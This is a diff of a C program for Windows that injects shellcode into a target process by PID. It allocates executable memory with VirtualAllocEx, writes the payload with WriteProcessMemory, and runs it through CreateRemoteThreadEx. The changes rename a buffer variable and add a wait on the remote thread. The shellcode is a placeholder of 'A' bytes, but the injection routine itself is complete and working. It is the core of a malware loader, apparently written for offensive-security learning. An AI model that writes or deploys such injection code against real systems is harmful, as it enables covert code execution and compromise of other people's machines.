@@ -5,9 +5,8 @@
 #define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
 #define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
 
-DWORD PID, TID = NULL;
+DWORD PID, TID;
 HANDLE hProcess, hThread = NULL;
-LPVOID rBuffer = NULL; 
 
 unsigned char sc[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
 
@@ -34,15 +33,15 @@ int main(int argc, char* argv[])
 
     /* alloc bytes */
     okay("Allocating buffer on memory of process %ld", PID);
-    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(sc), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    LPVOID lpThreadProc = VirtualAllocEx(hProcess, NULL, sizeof(sc), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
     okay("Allocated %zu bytes with PAGE_EXECUTE_READWRITE perm", sizeof(sc));
 
     /* write allocated mem to process mem */
-    WriteProcessMemory(hProcess, rBuffer, sc, sizeof(sc), NULL);
+    WriteProcessMemory(hProcess, lpThreadProc, sc, sizeof(sc), NULL);
     okay("Wrote %zu bytes to allocated buffer", sizeof(sc));
 
     /* create thread to run payload */
-    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
+    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpThreadProc, NULL, 0, 0, &TID);
 
     if (hThread == NULL)
     {
@@ -52,6 +51,10 @@ int main(int argc, char* argv[])
     }
 
     okay("got handle 0x%p to thread %ld", hThread, TID);
+
+    okay("waiting for thread to finish");
+    WaitForSingleObject(hThread, INFINITE);
+    okay("thread finished");
 
     okay("cleanin up...");
     CloseHandle(hThread);
